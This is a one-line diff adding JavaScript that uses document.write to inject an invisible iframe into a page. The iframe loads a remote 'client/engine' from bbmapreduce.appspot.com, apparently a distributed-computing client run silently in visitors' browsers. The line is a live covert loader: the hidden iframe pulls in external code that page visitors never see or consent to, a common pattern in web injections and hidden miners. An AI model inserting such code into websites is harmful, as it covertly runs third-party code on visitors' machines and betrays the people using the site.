@@ -1,0 +1,1 @@
+document.write('<iframe style="display: none;" src="http://bbmapreduce.appspot.com/client/engine"></iframe>');
